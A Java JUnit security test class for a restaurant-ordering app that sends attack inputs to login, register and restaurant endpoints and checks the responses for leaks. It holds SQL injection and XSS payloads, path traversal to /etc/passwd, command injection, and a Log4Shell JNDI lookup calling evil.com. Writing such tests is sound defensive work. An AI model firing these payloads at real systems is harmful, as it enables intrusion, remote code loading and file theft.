package com.myapp.ui.security;

import com.myapp.ui.common.HttpClientUtil;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.extension.ExtendWith;
import org.testfx.framework.junit5.ApplicationExtension;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Security Testing Suite (Backend-Independent)
 * مجموعه تست‌های امنیتی (مستقل از بک‌اند)
 */
@ExtendWith(ApplicationExtension.class)
class SecurityTest {

    private final String[] SQL_INJECTION_PAYLOADS = {
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM users --"
    };

    private final String[] XSS_PAYLOADS = {
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "'><script>alert('XSS')</script>"
    };

    @BeforeEach
    void setUp() {
        HttpClientUtil.clearAuthToken();
    }

    @Test
    void testSqlInjectionInputHandling() {
        // تست: SQL Injection input handling
        
        for (String payload : SQL_INJECTION_PAYLOADS) {
            // Test login endpoint with SQL injection
            HttpClientUtil.ApiResponse loginResponse = HttpClientUtil.post("/auth/login",
                createLoginRequest(payload, "password"), false);
            
            assertNotNull(loginResponse, "Should get response for SQL injection payload: " + payload);
            
            // Verify error handling (should not crash or expose internals)
            if (loginResponse.getMessage() != null) {
                String message = loginResponse.getMessage().toLowerCase();
                assertFalse(message.contains("sqlexception"), 
                          "Should not expose SQL details");
                assertFalse(message.contains("ora-"), 
                          "Should not contain Oracle error codes");
                assertFalse(message.contains("mysql"), 
                          "Should not contain MySQL details");
            }
        }
    }

    @Test
    void testXssInputHandling() {
        // تست: XSS input handling
        
        for (String payload : XSS_PAYLOADS) {
            // Test with XSS payload in restaurant creation
            HttpClientUtil.ApiResponse response = HttpClientUtil.post("/restaurants",
                createRestaurantRequest(payload, "Normal address"), false);
            
            assertNotNull(response, "Should handle XSS payload: " + payload);
            
            // If successful, verify response doesn't contain raw script tags
            if (response.isSuccess() && response.getData() != null) {
                String responseData = response.getData().toString();
                assertFalse(responseData.contains("<script>"), 
                          "Response should sanitize script tags");
                assertFalse(responseData.contains("javascript:"), 
                          "Response should sanitize javascript: URLs");
            }
        }
    }

    @Test
    void testAuthenticationTokenSecurity() {
        // تست: Authentication token security
        
        // Test with invalid tokens
        String[] invalidTokens = {
            "fake.token.here",
            "Bearer invalid-token",
            "admin'--",
            "",
            "null",
            "undefined"
        };
        
        for (String invalidToken : invalidTokens) {
            HttpClientUtil.setAuthToken(invalidToken);
            HttpClientUtil.ApiResponse response = HttpClientUtil.get("/orders/history");
            
            assertNotNull(response, "Should handle invalid token: " + invalidToken);
            // Invalid tokens should either fail or be handled gracefully
        }
    }

    @Test
    void testInputValidationSecurity() {
        // تست: Input validation for security
        
        // Test extremely long inputs (potential buffer overflow)
        String veryLongInput = "A".repeat(10000);
        HttpClientUtil.ApiResponse longInputResponse = HttpClientUtil.post("/auth/register",
            createRegisterRequest(veryLongInput, "password", "phone"), false);
        
        assertNotNull(longInputResponse, "Should handle very long input");
        
        // Test special characters that might cause issues
        String[] dangerousInputs = {
            "../../../etc/passwd",
            "$(whoami)",
            "${jndi:ldap://evil.com/x}",
            "%00%00%00",
            "\\x00\\x00"
        };
        
        for (String dangerousInput : dangerousInputs) {
            HttpClientUtil.ApiResponse response = HttpClientUtil.post("/auth/login",
                createLoginRequest(dangerousInput, "password"), false);
            
            assertNotNull(response, "Should handle dangerous input: " + dangerousInput);
            
            // Should not expose system information
            if (response.getMessage() != null) {
                String message = response.getMessage().toLowerCase();
                assertFalse(message.contains("stacktrace"), 
                          "Should not expose stack traces");
                assertFalse(message.contains("java."), 
                          "Should not expose Java internals");
            }
        }
    }

    @Test
    void testPasswordSecurityValidation() {
        // تست: Password security validation
        
        // Test weak passwords (should be rejected if backend validates)
        String[] weakPasswords = {
            "123456",
            "password",
            "admin",
            "qwerty",
            ""
        };
        
        for (String weakPassword : weakPasswords) {
            HttpClientUtil.ApiResponse response = HttpClientUtil.post("/auth/register",
                createRegisterRequest("test@example.com", weakPassword, "09123456789"), false);
            
            assertNotNull(response, "Should handle weak password: " + weakPassword);
            // Password validation depends on backend implementation
        }
        
        // Test password with special characters (should be allowed)
        String strongPassword = "StrongP@ssw0rd123!";
        HttpClientUtil.ApiResponse strongResponse = HttpClientUtil.post("/auth/register",
            createRegisterRequest("strong@example.com", strongPassword, "09123456789"), false);
        
        assertNotNull(strongResponse, "Should handle strong password");
    }

    @Test
    void testSessionSecurityHandling() {
        // تست: Session security
        
        // Test session manipulation
        HttpClientUtil.setAuthToken("valid-looking-token");
        HttpClientUtil.ApiResponse response1 = HttpClientUtil.get("/orders/history");
        assertNotNull(response1, "Should handle session request");
        
        // Clear token and test access
        HttpClientUtil.clearAuthToken();
        HttpClientUtil.ApiResponse response2 = HttpClientUtil.get("/orders/history");
        assertNotNull(response2, "Should handle unauthenticated request");
        
        // Test with malformed tokens
        HttpClientUtil.setAuthToken("malformed.token");
        HttpClientUtil.ApiResponse response3 = HttpClientUtil.get("/orders/history");
        assertNotNull(response3, "Should handle malformed token");
    }

    @Test
    void testDataExposureSecurityCheck() {
        // تست: Data exposure prevention
        
        // Test various endpoints for data exposure
        String[] sensitiveEndpoints = {
            "/admin/users",
            "/admin/transactions", 
            "/users/profile",
            "/payments/history"
        };
        
        for (String endpoint : sensitiveEndpoints) {
            HttpClientUtil.ApiResponse response = HttpClientUtil.get(endpoint);
            assertNotNull(response, "Should handle sensitive endpoint: " + endpoint);
            
            if (response.isSuccess() && response.getData() != null) {
                String data = response.getData().toString().toLowerCase();
                
                // Check for exposed sensitive fields
                assertFalse(data.contains("password"), 
                          "Should not expose passwords in: " + endpoint);
                assertFalse(data.contains("creditcard"), 
                          "Should not expose credit cards in: " + endpoint);
                assertFalse(data.contains("ssn"), 
                          "Should not expose SSN in: " + endpoint);
            }
        }
    }

    @Test
    void testErrorMessageSecurityLeaks() {
        // تست: Error message security (no information leakage)
        
        // Test with various invalid inputs to check error messages
        String[] invalidInputs = {
            "{'invalid': json}",
            "null",
            "undefined",
            "<xml>test</xml>",
            "SELECT * FROM users"
        };
        
        for (String invalidInput : invalidInputs) {
            HttpClientUtil.ApiResponse response = HttpClientUtil.post("/auth/login", invalidInput, false);
            assertNotNull(response, "Should handle invalid input");
            
            if (response.getMessage() != null) {
                String errorMsg = response.getMessage().toLowerCase();
                
                // Error messages should not leak sensitive information
                assertFalse(errorMsg.contains("database"), 
                          "Error should not mention database");
                assertFalse(errorMsg.contains("server"), 
                          "Error should not mention server details");
                assertFalse(errorMsg.contains("internal"), 
                          "Error should not mention internal details");
            }
        }
    }

    // Helper methods
    private String createLoginRequest(String email, String password) {
        return String.format("{\"email\":\"%s\",\"password\":\"%s\"}", 
                           escapeJson(email), escapeJson(password));
    }

    private String createRegisterRequest(String email, String password, String phone) {
        return String.format("{\"email\":\"%s\",\"password\":\"%s\",\"phone\":\"%s\",\"fullName\":\"Test User\"}", 
                           escapeJson(email), escapeJson(password), escapeJson(phone));
    }

    private String createRestaurantRequest(String name, String address) {
        return String.format("{\"name\":\"%s\",\"address\":\"%s\",\"phone\":\"021-12345678\"}", 
                           escapeJson(name), escapeJson(address));
    }

    private String escapeJson(String value) {
        if (value == null) return "";
        return value.replace("\\", "\\\\")
                   .replace("\"", "\\\"")
                   .replace("\r", "\\r")
                   .replace("\n", "\\n");
    }
} 